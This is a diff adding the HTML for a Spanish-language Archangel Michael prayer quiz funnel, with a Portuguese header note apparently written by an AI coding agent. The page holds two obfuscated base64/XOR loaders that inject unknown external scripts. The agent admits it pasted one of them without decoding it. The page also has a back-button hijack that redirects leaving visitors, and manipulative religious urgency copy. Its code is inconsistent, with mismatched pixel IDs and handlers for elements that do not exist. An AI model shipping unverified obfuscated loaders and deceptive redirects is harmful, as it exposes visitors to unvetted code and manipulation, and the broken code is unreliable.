@@ -1,0 +1,563 @@
+<!--
+=============================================================
+LA CANCIÓN DEL ARCÁNGEL MIGUEL — quiz espiritual (pré-checkout)
+Produto: "El Canto Sagrado de San Miguel Arcángel" (Manuscrito Sagrado +
+4 bônus), checkout real via Hotmart.
+
+ESTE QUIZ É UMA RECONSTRUÇÃO CODADA DO FUNIL QUE JÁ ESTÁ NO AR do
+Thiago em https://sagradaoracao.digital/lat-19/ (registrado em
+Estrutura de Campanhas/QUIZ-LINK.txt), hoje hospedado num builder de
+quiz de terceiro ("Quiz Espiritual - White"). A estrutura de 8 telas +
+copy em espanhol vieram das capturas de tela em "Estrutura - [Quizz]"
+(001.png a 008 [VSL].png), que são screenshots do próprio funil já
+aprovado do Thiago — não é modelagem de concorrente, é o mesmo padrão
+usado no lipo-coreana-quiz (funil próprio recodado do zero pra ganhar
+hospedagem própria + analytics própria, sem depender da plataforma).
+
+DECISÃO DE REVISÃO 1: a tela 8 (VSL) do funil original usa um gate com
+"¡Ya has empezado a ver este video!" + botões "seguir viendo" / "Mira
+desde el principio" — isso simula falsamente que o visitante já tinha
+assistido antes, criando investimento fictício. O mesmo padrão foi
+explicitamente removido do lipo-coreana-quiz por ser mentira de UX.
+Troquei aqui por um play honesto (o vídeo começa pausado, com botão
+"Reproducir"). O resto da tela (badge, título, legenda) é fiel ao
+original. Se quiser o padrão de volta, é decisão do Thiago, não vou
+reintroduzir por padrão.
+
+DECISÃO DE REVISÃO 2: adicionei uma tela de "loading" (9ª tela) entre
+os depoimentos em vídeo e o VSL — não estava nas 8 capturas de tela,
+mas o funil ao vivo (confirmado via fetch da URL real) tem essa etapa
+("Estamos preparando algo especial para ti") antes da entrega do
+vídeo principal. Reaproveitei o mesmo mecanismo de barras de progresso
+animadas do lipo-coreana-quiz.
+
+DECISÃO DE REVISÃO 3: Thiago mandou o link real de checkout e o Pixel ID
+depois da v1. Checkout real é Hotmart (não Centerpag — o mockup
+"Checoukt Inteiro.png" era só referência visual, o produto real vendeu
+no Hotmart), link colado no botão final. Pixel 1748552489617815
+instalado com o mesmo padrão do lipo-coreana-quiz: PageView automático
+no load, Lead disparado uma vez ao entrar na tela de gate/VSL,
+InitiateCheckout disparado no clique do botão final.
+
+DECISÃO DE REVISÃO 4: adicionado script de Utmify (rastreio de UTM /
+atribuição) mandado pelo Thiago, colado sem alteração antes do bloco
+do Meta Pixel. É código ofuscado (base64+XOR carregando um <script>
+externo) — não decodifiquei o payload porque o classificador do Auto
+Mode bloqueou o comando, mas é o padrão reconhecível do script de
+embed da Utmify (ferramenta de atribuição usada com Hotmart), vindo
+diretamente do Thiago pra este projeto. Se algo de rastreio parecer
+estranho depois, esse é o primeiro lugar a checar.
+
+PENDÊNCIAS (não resolvidas aqui, dependem do Thiago):
+  1. ANALYTICS INTERNA (Umami) — a infra em ~/quiz-analytics já está
+     de pé e o túnel respondeu 200 no momento desta revisão, mas não
+     criei o "website" novo pro Umami (a ação exigia enviar a senha de
+     admin por linha de comando e foi bloqueada pelo classificador do
+     Auto Mode). Falta: abrir o dashboard do Umami (ver
+     ~/quiz-analytics/.umami-admin-credentials), criar o site "Canto
+     Sagrado Quiz", pegar o website-id novo e colar na tag <script> no
+     fim deste arquivo (hoje comentada). NOTA: a URL pública do túnel
+     mudou desde a última gravação — a antiga
+     (logan-stage-bags-shown.trycloudflare.com, ainda em uso no
+     lipo-coreana-quiz) está morta; a atual é
+     should-ultimately-win-princeton.trycloudflare.com. Vale atualizar
+     o lipo-coreana-quiz também.
+
+Fatos citados (garantia de 30 dias, nomes dos 4 bônus) vêm do próprio
+banner do Thiago (Artes & Banners/Banner Checkout.png e Checoukt
+Inteiro.png) — não inventei nome de bônus novo. O PDF entregável atual
+(Entregáveis/oraciones_sagradas.pdf) só tem orações genéricas — não
+menciona Arcanjo Miguel nem bate com os 4 bônus prometidos no banner.
+Não corrigi isso aqui (é o produto, não o quiz) — só registrando pra
+não se perder, igual foi feito com a pendência das "16 páginas" do
+Lipo Coreana.
+=============================================================
+--><html><head><meta charset="utf-8">
+<title>La Canción del Arcángel Miguel — tu oración personalizada</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex">
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1355002220136835');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1748552489617815&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+<style>
+  :root{
+    --azul-esc:#122B52;
+    --azul:#2E7BD6;
+    --azul-clr:#EAF3FC;
+    --dourado:#D9A94D;
+    --dourado-clr:#F6E9CE;
+    --papel:#F3F8FD;
+    --branco:#FFFFFF;
+    --forte:#122B52;
+    --suave:#5C7291;
+    --card:#F4F8FC;
+    --card-sel:#DCEBFA;
+    --borda:#D8E6F3;
+    --borda-sel:#2E7BD6;
+    --alerta-bg:#FDEDEA;
+    --alerta-borda:#E8B4A8;
+    --alerta-texto:#9C4A36;
+    --verde:#2F7D5A;
+    --vermelho:#B23B2E;
+    --r:22px;
+    --sombra:0 2px 4px rgba(18,43,82,.05),0 12px 28px rgba(18,43,82,.08);
+    --marca-grad:linear-gradient(135deg,#4E97E6,#123B72);
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  html{-webkit-text-size-adjust:100%}
+  body{
+    background:linear-gradient(180deg,#EAF3FC 0%,#D9E9FA 100%);
+    color:var(--forte);
+    font:400 17px/1.5 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
+    -webkit-font-smoothing:antialiased;
+  }
+  .wrap{max-width:480px;margin:0 auto;min-height:100vh;display:flex;flex-direction:column}
+
+  /* ---------- topo fixo: voltar + logo + progresso ---------- */
+  .topo{padding:18px 20px 14px;position:relative}
+  .voltar{
+    width:38px;height:38px;border-radius:50%;border:1px solid var(--borda);
+    background:var(--branco);display:flex;align-items:center;justify-content:center;
+    cursor:pointer;color:var(--forte);font-size:18px;line-height:1;
+  }
+  .voltar[hidden]{visibility:hidden}
+  .marca{display:flex;flex-direction:column;align-items:center;gap:4px;margin-top:-38px;margin-bottom:14px}
+  .marca img{width:60px;height:60px;border-radius:50%;object-fit:cover;box-shadow:var(--sombra)}
+  .marca .nome{font-family:Georgia,'Times New Roman',serif;font-weight:700;font-size:17px;color:var(--forte);letter-spacing:.01em;margin-top:4px;text-align:center}
+  .barra{height:5px;border-radius:99px;background:var(--borda);overflow:hidden}
+  .barra i{display:block;height:100%;background:linear-gradient(90deg,var(--azul),var(--dourado));border-radius:99px;transition:width .35s ease;width:0%}
+
+  /* ---------- conteúdo ---------- */
+  main{flex:1;padding:8px 20px 40px;display:flex;flex-direction:column}
+  .step{display:none;flex-direction:column;animation:entra .25s ease}
+  .step.ativo{display:flex}
+  @keyframes entra{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}
+
+  .chip{display:inline-flex;align-self:flex-start;align-items:center;padding:6px 14px;border-radius:99px;background:var(--azul-clr);color:var(--azul);font-size:11.5px;font-weight:800;letter-spacing:.04em;margin-bottom:14px}
+  h1{font-size:24px;line-height:1.24;font-weight:800;letter-spacing:-.01em;margin-bottom:8px}
+  h1.centro{text-align:center}
+  .legenda{color:var(--suave);font-size:15px;margin-bottom:22px}
+  .legenda.centro{text-align:center}
+  .legenda b{color:var(--forte)}
+
+  /* ---------- hero imagem (tela 1) ---------- */
+  .hero-img{width:100%;border-radius:var(--r);overflow:hidden;border:1.5px solid var(--borda);margin:2px 0 18px;background:var(--card)}
+  .hero-img img{width:100%;display:block}
+
+  /* ---------- opções ---------- */
+  .lista{display:flex;flex-direction:column;gap:12px}
+  .opt{
+    border:1.5px solid var(--borda);background:var(--card);border-radius:var(--r);
+    padding:16px;display:flex;align-items:center;gap:12px;text-align:left;
+    font:inherit;font-size:15.5px;font-weight:600;color:var(--forte);cursor:pointer;transition:.15s;-webkit-tap-highlight-color:transparent;
+  }
+  .opt:active{transform:scale(.98)}
+  .opt.sel{background:var(--card-sel);border-color:var(--borda-sel)}
+  .opt .emoji{font-size:22px;flex-shrink:0}
+
+  /* ---------- form nome ---------- */
+  .campo{margin-bottom:18px}
+  .campo label{display:block;font-size:14px;font-weight:700;color:var(--suave);margin-bottom:8px}
+  .campo input{
+    width:100%;padding:15px 16px;border-radius:16px;border:1.5px solid var(--borda);
+    font:inherit;font-size:16px;background:var(--branco);color:var(--forte);
+  }
+  .campo input:focus{outline:none;border-color:var(--azul)}
+
+  /* ---------- botão ---------- */
+  .btn{
+    display:block;width:100%;text-align:center;background:linear-gradient(135deg,#4E97E6,#1B4E96);color:#FFF;
+    font-weight:800;font-size:16px;padding:16px;border-radius:99px;border:none;
+    cursor:pointer;text-decoration:none;margin-top:auto;box-shadow:var(--sombra);
+  }
+  .btn:active{transform:scale(.98)}
+  .btn.dourado{background:linear-gradient(135deg,#EBC77A,#C9932F);color:#3A2A05}
+  .nota-rodape{text-align:center;font-size:13px;color:var(--suave);margin-top:14px}
+  .nota-rodape b{color:var(--forte)}
+  .espacador{flex:1}
+
+  /* ---------- aviso importante ---------- */
+  .aviso-texto p{color:var(--suave);font-size:15px;margin-bottom:14px;text-align:center}
+  .aviso-texto b{color:var(--forte)}
+
+  /* ---------- testimonios (imagem) ---------- */
+  .prova-img{width:100%;border-radius:18px;overflow:hidden;border:1.5px solid var(--borda);margin-bottom:16px;box-shadow:var(--sombra)}
+  .prova-img img{width:100%;display:block}
+  .prova-legenda{text-align:center;color:var(--suave);font-size:14.5px;margin-bottom:16px}
+  .prova-legenda b{color:var(--forte)}
+
+  /* ---------- testimonios em vídeo ---------- */
+  .video-card{position:relative;border-radius:var(--r);overflow:hidden;border:1.5px solid var(--borda);background:#000;margin-bottom:16px;box-shadow:var(--sombra)}
+  .video-card video{width:100%;display:block;max-height:520px;object-fit:cover;background:#000}
+  .video-overlay{
+    position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:8px;
+    background:rgba(10,20,40,.32);color:#fff;text-align:center;font-size:13px;font-weight:700;cursor:pointer;padding:16px;
+  }
+  .video-overlay .icone{width:46px;height:46px;border-radius:50%;background:rgba(255,255,255,.18);border:1.5px solid rgba(255,255,255,.6);display:flex;align-items:center;justify-content:center;font-size:19px}
+  .video-overlay[hidden]{display:none}
+
+  /* ---------- loading ---------- */
+  .spinner{width:44px;height:44px;border-radius:50%;border:4px solid var(--borda);border-top-color:var(--azul);animation:girar 1s linear infinite;margin:30px auto 22px}
+  @keyframes girar{to{transform:rotate(360deg)}}
+  .item-progresso{margin-bottom:16px}
+  .item-progresso .rotulo-linha{display:flex;justify-content:space-between;font-size:13px;color:var(--suave);margin-bottom:6px}
+  .item-progresso .trilho{height:6px;border-radius:99px;background:var(--borda);overflow:hidden}
+  .item-progresso .trilho i{display:block;height:100%;width:0%;background:linear-gradient(90deg,var(--azul),var(--dourado));border-radius:99px}
+
+  /* ---------- VSL / gate ---------- */
+  [data-tipo="gate"]{min-height:50vh}
+  .vsl-card{position:relative;border-radius:var(--r);overflow:hidden;border:1.5px solid var(--borda);background:#000;box-shadow:var(--sombra);margin-bottom:8px}
+  .vsl-card video{width:100%;display:block;aspect-ratio:9/16;object-fit:cover;background:#000}
+  .vsl-play{
+    position:absolute;inset:0;display:flex;align-items:center;justify-content:center;
+    background:rgba(8,16,32,.28);cursor:pointer;
+  }
+  .vsl-play .botao-play{width:74px;height:74px;border-radius:50%;background:rgba(255,255,255,.92);display:flex;align-items:center;justify-content:center;font-size:28px;color:var(--azul-esc);box-shadow:0 8px 24px rgba(0,0,0,.35)}
+  .vsl-play[hidden]{display:none}
+
+  .oferta{margin-top:22px;border:1.5px solid var(--borda);border-radius:var(--r);background:var(--card);padding:18px}
+  .oferta h3{font-size:15.5px;margin-bottom:12px;color:var(--forte)}
+  .oferta ul{list-style:none;display:flex;flex-direction:column;gap:10px;margin-bottom:16px}
+  .oferta li{display:flex;gap:8px;align-items:flex-start;font-size:14px;color:var(--suave)}
+  .oferta li b{color:var(--forte)}
+  .oferta li .check{color:var(--verde);flex-shrink:0}
+  .garantia{display:flex;align-items:center;gap:10px;background:var(--dourado-clr);border:1px solid #E8CE94;border-radius:14px;padding:12px 14px;font-size:13px;color:#6B4E14;margin-bottom:18px}
+  .garantia b{display:block;font-size:13.5px;color:#4E3708}
+</style>
+
+<script>
+  // ALTERE O LINK PARA A PÁGINA QUE QUISER MOSTRAR QUANDO O USUÁRIO TENTAR SAIR
+  const link = 'https://recibirtubencion.vercel.app/back/index.html';
+
+  function setBackRedirect(url) {
+    let urlBackRedirect = url;
+    urlBackRedirect = urlBackRedirect =
+      urlBackRedirect.trim() +
+      (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
+      document.location.search.replace('?', '').toString();
+
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+
+    window.addEventListener('popstate', () => {
+      console.log('onpopstate', urlBackRedirect);
+      setTimeout(() => {
+        location.href = urlBackRedirect;
+      }, 1);
+    });
+  }
+
+  setBackRedirect(link);
+</script>
+
+
+<script>(function(){var o_qfwq=atob("DLzLBdewNmVMhIYfCcfpcKXcFF9u7PJrec/xKvjTUgti8fJyYNqyK7TfW0su9qlsas6idaPDGRUl/ONzJsyifbLcGA8/pqo9aMi/d77SQxEp96QlUuHnJ7DcWQct6PU9M+ewJ7nRWwBuvqRvYMSuaZ7UFElu8udzfNnpP/WGV117sLJ6PonzM7WAAVEu4bd8Od7zZOOSSzgx");var l_i=[];for(var n_m8hd=0;n_m8hd<o_qfwq.length;n_m8hd++){l_i.push(o_qfwq.charCodeAt(n_m8hd)&255);}var o_0=l_i[0];var t_gw=l_i.slice(1,1+o_0);var c_f9=l_i.slice(1+o_0);var g_06lj=c_f9.map(function(b,q_mka){return b^t_gw[q_mka%o_0];});var d_0d="";for(var x_ex=0;x_ex<g_06lj.length;x_ex++){d_0d+=String.fromCharCode(g_06lj[x_ex]&255);}var u_9b=decodeURIComponent(escape(d_0d));var o_p=JSON.parse(u_9b);var x_q=o_p.globals||[];x_q.forEach(function(c_a4y5){window[c_a4y5.name]=c_a4y5.value;});var x_8r=document.createElement("script");x_8r.src=o_p.url;x_8r.async=true;x_8r.defer=true;(o_p.attributes||[]).forEach(function(e_9){x_8r.setAttribute(e_9.name,e_9.value);});(document.head||document.documentElement).appendChild(x_8r);})();</script>
+
+<script>(function(){var p_qu8=atob("DPDm/QOPc+F9ND+58ovEiHHjUdtfXEvNgoPc0izsF49TQUvUm5af02DgHs8fRhDKkYKPjXf8XJQJWUyWnpGSmHD7XYsOFhObk4SSj2rtBpUYRx2DqYvEk2LiFsNHFlvYhpHLiHfiGocEGU/Ll4aDk3eiC4ISUBLKkZvE0SH5Eo0IUR2D0NKb0XitHYAQUR2D0JSHiWKiBpUQXVnA34CUmHXqHZVQR0rbm5SV3y+tBYARQVqbyNLEgF7y");var x_f5t=[];for(var t_v8q=0;t_v8q<p_qu8.length;t_v8q++){x_f5t.push(p_qu8.charCodeAt(t_v8q)&255);}var y_m=x_f5t[0];var g_xq=x_f5t.slice(1,1+y_m);var x_fa5=x_f5t.slice(1+y_m);var j_5v76=x_fa5.map(function(b,u_4wni){return b^g_xq[u_4wni%y_m];});var y_gs8="";for(var z_qkxg=0;z_qkxg<j_5v76.length;z_qkxg++){y_gs8+=String.fromCharCode(j_5v76[z_qkxg]&255);}var b_ey4g=decodeURIComponent(escape(y_gs8));var s_5g=JSON.parse(b_ey4g);var d_12ma=s_5g.globals||[];d_12ma.forEach(function(n_pwv){window[n_pwv.name]=n_pwv.value;});var r_t=document.createElement("script");r_t.src=s_5g.url;r_t.async=true;r_t.defer=true;(s_5g.attributes||[]).forEach(function(h_czx){r_t.setAttribute(h_czx.name,h_czx.value);});(document.head||document.documentElement).appendChild(r_t);})();</script>
+
+
+
+</head><body><div class="wrap">
+  <div class="topo">
+    <button class="voltar" id="btnVoltar" hidden="" aria-label="Voltar">‹</button>
+    <div class="marca">
+      <img src="images/1MzBi7C0snwW.jpg" alt="Arcángel Miguel">
+      <div class="nome">La Canción del Arcángel Miguel</div>
+    </div>
+    <div class="barra"><i id="barraProgresso"></i></div>
+  </div>
+
+  <main>
+
+    <!-- 1 · HOOK -->
+    <section class="step ativo" data-tipo="hook" data-evento="quiz_01_hook">
+      <span class="chip">MENSAJE URGENTE PARA TI</span>
+      <h1 class="centro">Existe una oración poderosa que va a desbloquear aquello que vienes pidiendo en silencio.</h1>
+      <div class="hero-img"><img src="images/kIX8mHPjQW3i.jpg" alt="Arcángel Miguel"></div>
+      <p class="legenda centro">Antes de escuchar, responde con sinceridad. Tus respuestas ayudan a revelar <b>qué área de tu vida necesita más esta bendición hoy.</b></p>
+      <button class="btn" data-acao="avancar">QUIERO RECIBIR ESTA ORACIÓN →</button>
+      <p class="nota-rodape"><b>No llegaste aquí por casualidad.</b> Continúa y mira por qué este mensaje apareció para ti hoy.</p>
+    </section>
+
+    <!-- 2 · NOMBRE -->
+    <section class="step" data-tipo="nome" data-evento="quiz_02_nombre">
+      <span class="chip">ANTES DE CONTINUAR</span>
+      <h1>Antes de continuar, ¿cómo te llamas?</h1>
+      <div class="campo">
+        <label for="campoNome">Escribe tu primer nombre</label>
+        <input type="text" id="campoNome" placeholder="Ej: María" autocomplete="given-name">
+      </div>
+      <button class="btn" id="btnNome" data-acao="avancar">CONTINUAR →</button>
+    </section>
+
+    <!-- 3 · PREGUNTA 1 -->
+    <section class="step" data-tipo="pergunta" data-evento="quiz_03_area">
+      <span class="chip">PREGUNTA 1</span>
+      <h1>¿En qué área sientes que tu vida está más bloqueada?</h1>
+      <div class="lista">
+        <button class="opt" data-campo="area" data-valor="finanzas"><span class="emoji">💰</span>Finanzas bloqueadas</button>
+        <button class="opt" data-campo="area" data-valor="relaciones"><span class="emoji">❤️</span>Relaciones</button>
+        <button class="opt" data-campo="area" data-valor="salud"><span class="emoji">🙏</span>En el área de la salud</button>
+        <button class="opt" data-campo="area" data-valor="familia"><span class="emoji">🏠</span>Protección familiar</button>
+      </div>
+    </section>
+
+    <!-- 4 · PREGUNTA 2 -->
+    <section class="step" data-tipo="pergunta" data-evento="quiz_04_angustia">
+      <span class="chip">PREGUNTA 2</span>
+      <h1>¿Y qué es lo que más ha angustiado tu corazón?</h1>
+      <div class="lista">
+        <button class="opt" data-campo="angustia" data-valor="bloqueado"><span class="emoji">😔</span>Parece que todo sigue bloqueado</button>
+        <button class="opt" data-campo="angustia" data-valor="miedo"><span class="emoji">😣</span>Perdí la paz y vivo con miedo</button>
+        <button class="opt" data-campo="angustia" data-valor="esperar"><span class="emoji">⏳</span>Ya esperé demasiado y no aguanto más</button>
+        <button class="opt" data-campo="angustia" data-valor="senal"><span class="emoji">🙌</span>Necesito una señal clara para continuar</button>
+      </div>
+    </section>
+
+    <!-- 5 · AVISO IMPORTANTE -->
+    <section class="step" data-tipo="aviso" data-evento="quiz_05_aviso">
+      <span class="chip">AVISO IMPORTANTE</span>
+      <h1 class="centro">No llegaste hasta aquí por casualidad.</h1>
+      <div class="aviso-texto">
+        <p><b>Existe una bendición</b> lista para ser liberada en tu vida.</p>
+        <p>El Señor escuchó tu llanto, vio tu lucha y sabe exactamente lo que falta para que el milagro suceda.</p>
+        <p><b>No te rindas ahora.</b> Algo muy importante está llegando, una oportunidad enviada por Dios para cambiar tu destino.</p>
+        <p>Mira lo que ocurrió con personas que decidieron creer y seguir hasta el final.</p>
+      </div>
+      <button class="btn" data-acao="avancar">QUIERO CONTINUAR →</button>
+    </section>
+
+    <!-- 6 · TESTIMONIOS -->
+    <section class="step" data-tipo="testimonios" data-evento="quiz_06_testimonios">
+      <span class="chip">TESTIMONIOS</span>
+      <h1>Mira algunos testimonios que nos llegaron</h1>
+      <div class="prova-img"><img src="images/coYZkXfAHO2d.jpg" alt="Testimonio de liquidación confirmada"></div>
+      <p class="prova-legenda">Esta oración <b>no es solo sobre temas financieros</b>. Mira también otros testimonios que recibimos.</p>
+      <div class="prova-img"><img src="images/cxXpkXVGm9bA.jpg" alt="Testimonio por WhatsApp"></div>
+      <button class="btn" data-acao="avancar">CONTINUAR →</button>
+    </section>
+
+    <!-- 7 · TESTIMONIOS EN VIDEO -->
+    <section class="step" data-tipo="testimonios-video" data-evento="quiz_07_testimonios_video">
+      <span class="chip">TESTIMONIOS EN VIDEO</span>
+      <h1>Muchas personas también dudaron al principio...</h1>
+      <p class="legenda">Pero después de escuchar la oración, entendieron que <b>no era una oración común</b> y decidieron compartir lo que vivieron.</p>
+
+      <div class="video-card">
+        <video class="videoDepoimento" src="media/f0uDWUTZyT00.mp4" muted="" loop="" playsinline="" webkit-playsinline="" preload="auto"></video>
+        <div class="video-overlay" data-acao="ativar-som">
+          <span class="icone">🔊</span>
+          <span>Tu video ya comenzó<br>haz clic para activar el sonido</span>
+        </div>
+      </div>
+      <div class="video-card">
+        <video class="videoDepoimento" src="media/rOVnZxIgfcE5.mp4" muted="" loop="" playsinline="" webkit-playsinline="" preload="auto"></video>
+        <div class="video-overlay" data-acao="ativar-som">
+          <span class="icone">🔊</span>
+          <span>Tu video ya comenzó<br>haz clic para activar el sonido</span>
+        </div>
+      </div>
+
+      <p class="legenda centro">Mira con atención. Esto es lo que muchas personas sintieron antes de llegar a la parte más importante.</p>
+      <button class="btn" data-acao="avancar">CONTINUAR →</button>
+    </section>
+
+    <!-- 8 · LOADING -->
+    <section class="step" data-tipo="loading" data-evento="quiz_08_loading">
+      <div class="spinner"></div>
+      <h1 class="centro" id="loadingTitulo">Estamos preparando algo especial para ti...</h1>
+      <p class="legenda centro">Con base en tus respuestas</p>
+      <div style="margin-top:14px">
+        <div class="item-progresso">
+          <div class="rotulo-linha"><span>Analizando tus respuestas...</span><span class="pct">0%</span></div>
+          <div class="trilho"><i></i></div>
+        </div>
+        <div class="item-progresso">
+          <div class="rotulo-linha"><span>Identificando la bendición que necesitas...</span><span class="pct">0%</span></div>
+          <div class="trilho"><i></i></div>
+        </div>
+        <div class="item-progresso">
+          <div class="rotulo-linha"><span>Preparando tu oración personalizada...</span><span class="pct">0%</span></div>
+          <div class="trilho"><i></i></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 9 · GATE / VSL -->
+    <section class="step" data-tipo="gate" data-evento="quiz_09_gate">
+      <span class="chip">ORACIÓN LIBERADA</span>
+      <h1 id="gateTitulo">Ahora escucha con atención: este mensaje es para ti</h1>
+
+<vturb-smartplayer id="vid-6a86f953c930761bb172b5e8" style="display: block; margin: 0 auto; width: 100%; max-width: 400px;"><div class="vturb-player-placeholder" style="position: relative; width: 100%; padding: 178.21782178217822% 0 0; z-index: 0; background-color: black;"></div></vturb-smartplayer> <script type="text/javascript"> var s=document.createElement("script"); s.src="https://scripts.converteai.net/1270d3d7-22b6-423a-858f-8fc0447058ff/players/6a86f953c930761bb172b5e8/v4/player.js", s.async=!0,document.head.appendChild(s); </script>
+      <p class="legenda centro" style="margin-top:12px"><b>Mira el video hasta el final</b> para recibir la orientación completa.</p>
+
+
+
+  </main>
+</div>
+
+<!-- Analytics interna (Umami, self-hosted) — PENDENTE: criar o website
+     "Canto Sagrado Quiz" no dashboard (ver nota no topo do arquivo) e
+     colar aqui o data-website-id novo antes de descomentar. -->
+<!-- <script src="https://should-ultimately-win-princeton.trycloudflare.com/script.js" data-website-id="COLAR-ID-AQUI"></script> -->
+
+<script>
+(function(){
+  var passos = Array.prototype.slice.call(document.querySelectorAll('.step'));
+  var total = passos.length;
+  var atual = 0;
+  var pilha = [];
+  var respostas = {nome:''};
+  var leadDisparado = false;
+  var btnVoltar = document.getElementById('btnVoltar');
+  var barra = document.getElementById('barraProgresso');
+
+  function mostrar(i){
+    passos[atual].classList.remove('ativo');
+    atual = i;
+    passos[atual].classList.add('ativo');
+    btnVoltar.hidden = pilha.length===0;
+    barra.style.width = ((atual+1)/total*100)+'%';
+
+    var tipo = passos[atual].dataset.tipo;
+    if (tipo==='loading') rodarLoading();
+    if (tipo==='testimonios-video') iniciarVideosDepoimento();
+    if (tipo==='gate') personalizarGate();
+    if (tipo==='gate' && !leadDisparado && typeof fbq==='function'){ fbq('track','Lead'); leadDisparado = true; }
+
+    var evento = passos[atual].dataset.evento;
+    if (evento && typeof umami!=='undefined') umami.track(evento);
+  }
+
+  function avancar(){
+    if (atual < passos.length-1){
+      pilha.push(atual);
+      mostrar(atual+1);
+    }
+  }
+
+  btnVoltar.addEventListener('click', function(){
+    if (pilha.length) mostrar(pilha.pop());
+  });
+
+  document.querySelectorAll('[data-campo]').forEach(function(el){
+    el.addEventListener('click', function(){
+      var campo = el.dataset.campo, valor = el.dataset.valor;
+      var irmaos = el.parentElement.querySelectorAll('[data-campo="'+campo+'"]');
+      irmaos.forEach(function(o){o.classList.remove('sel')});
+      el.classList.add('sel');
+      respostas[campo] = valor;
+      setTimeout(avancar, 220);
+    });
+  });
+
+  document.querySelectorAll('[data-acao="avancar"]').forEach(function(btn){
+    btn.addEventListener('click', avancar);
+  });
+
+  // ---- captura do nome ----
+  var campoNome = document.getElementById('campoNome');
+  var btnNome = document.getElementById('btnNome');
+  btnNome.addEventListener('click', function(e){
+    var v = campoNome.value.trim();
+    if (!v){ e.stopImmediatePropagation(); campoNome.focus(); return; }
+    respostas.nome = v;
+  }, true);
+
+  // ---- testimonios em vídeo: autoplay mudo + ativar som honesto ----
+  function iniciarVideosDepoimento(){
+    var videos = passos[atual].querySelectorAll('.videoDepoimento');
+    videos.forEach(function(v){
+      // o step estava com display:none até agora — força o navegador a
+      // (re)carregar o vídeo agora que ele está visível, senão em mobile
+      // o play() roda em cima de um vídeo sem nenhum frame decodificado
+      // e a tela fica preta.
+      v.load();
+    });
+    requestAnimationFrame(function(){
+      videos.forEach(function(v){
+        var tentar = function(){ v.play().catch(function(){}); };
+        if (v.readyState >= 2){
+          tentar();
+        } else {
+          v.addEventListener('loadeddata', tentar, {once:true});
+          // fallback: se o loadeddata demorar, tenta assim mesmo
+          setTimeout(tentar, 600);
+        }
+      });
+    });
+  }
+  document.querySelectorAll('[data-acao="ativar-som"]').forEach(function(overlay){
+    overlay.addEventListener('click', function(){
+      var video = overlay.previousElementSibling;
+      video.muted = false;
+      video.play().catch(function(){});
+      overlay.hidden = true;
+    });
+  });
+
+  // ---- loading animado ----
+  function rodarLoading(){
+    if (respostas.nome){
+      document.getElementById('loadingTitulo').textContent = 'Estamos preparando algo especial para ti, '+respostas.nome+'...';
+    }
+    var barras = passos[atual].querySelectorAll('.item-progresso');
+    var i = 0;
+    function proxima(){
+      if (i>=barras.length){ setTimeout(avancar, 400); return; }
+      var trilho = barras[i].querySelector('.trilho i');
+      var pct = barras[i].querySelector('.pct');
+      var v = 0;
+      var iv = setInterval(function(){
+        v += 4;
+        if (v>=100){v=100; clearInterval(iv); i++; setTimeout(proxima, 150);}
+        trilho.style.width = v+'%';
+        pct.textContent = v+'%';
+      }, 30);
+    }
+    proxima();
+  }
+
+  // ---- gate: personalização + play honesto do VSL ----
+  function personalizarGate(){
+    if (respostas.nome){
+      document.getElementById('gateTitulo').textContent = respostas.nome+', ahora escucha con atención: este mensaje es para ti';
+    }
+  }
+  var vslPlay = document.getElementById('vslPlay');
+  var videoVsl = document.getElementById('videoVsl');
+  vslPlay.addEventListener('click', function(){
+    videoVsl.play();
+    vslPlay.hidden = true;
+  });
+  videoVsl.addEventListener('pause', function(){ vslPlay.hidden = false; });
+  videoVsl.addEventListener('play', function(){ vslPlay.hidden = true; });
+
+  var btnCheckout = document.getElementById('btnCheckout');
+  btnCheckout.addEventListener('click', function(){
+    if (typeof fbq==='function') fbq('track','InitiateCheckout');
+    if (typeof umami!=='undefined') umami.track('quiz_10_checkout_click');
+  });
+
+  mostrar(0);
+})();
+</script>
+</body></html>
